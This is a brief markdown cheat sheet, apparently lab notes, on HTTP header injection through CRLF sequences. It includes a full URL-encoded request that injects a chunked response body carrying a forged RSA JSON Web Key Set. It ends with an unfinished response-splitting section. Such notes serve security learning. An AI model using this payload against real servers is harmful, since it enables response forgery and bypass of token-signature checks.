# HTTP Header Injection

Inject additional headers and content by splitting the HTTP response using `%0d%0a` for new lines.

Your response should have:

* A single blank line between the headers and the body content
* The correct `Content-Length`

## Replace HTTP Response content

Inject a `Transfer-Encoding: chunked` header.

Inject one or more data chunks by transmitting line consisting of the chunk length __IN HEXADEXIMAL__ followed by a newline `%0d%0a` followed by the actual chunk bytes and another newline `%0d%0a`.  

```
5%0d%0aHello%0d%0a
```

Inject a sequence indicating the end of the chunked encoding by sending a zero-length chunk with no body, i.e. `0%0d%0a%0d%0a`

A full injection would for example look like:
```
GET /debug?value=%0d%0aTransfer-Encoding:+chunked%0d%0a%0d%0a104%0d%0a%7b%22%6b%65%79%73%22%3a%5b%7b%22%6b%74%79%22%3a%22%52%53%41%22%2c%22%61%6c%67%22%3a%22%52%53%32%35%36%22%2c%22%6b%69%64%22%3a%22%70%65%6e%74%65%73%74%65%72%6c%61%62%22%2c%22%75%73%65%22%3a%22%73%69%67%22%2c%22%6e%22%3a%22%77%38%63%41%79%59%47%54%68%35%75%49%79%75%32%52%48%67%4a%6d%62%33%4e%4f%76%30%6a%78%7a%50%62%48%43%4f%32%36%39%76%50%56%35%2d%75%47%33%65%4b%58%64%33%71%4e%4c%45%55%63%41%4d%5a%7a%4f%57%34%53%6b%34%37%49%49%52%39%54%73%55%31%77%63%74%62%46%4b%66%37%56%75%6a%41%52%66%4d%4a%71%4d%76%31%62%74%39%64%6d%56%33%72%54%44%4e%53%64%34%2d%49%77%52%5f%54%4f%4b%7a%56%46%2d%38%71%69%53%6d%6b%6d%67%50%54%2d%34%52%47%62%4a%45%53%4a%50%4c%46%42%32%61%54%55%43%6e%78%32%35%67%54%30%74%73%7a%33%5f%74%59%62%48%65%2d%48%5f%34%45%22%2c%22%65%22%3a%22%41%51%41%42%22%7d%5d%7d%0d%0a0%0d%0a HTTP/1.1
```

## HTTP Response Splitting

Send back two HTTP Responses for a single HTTP Request being made.

TODO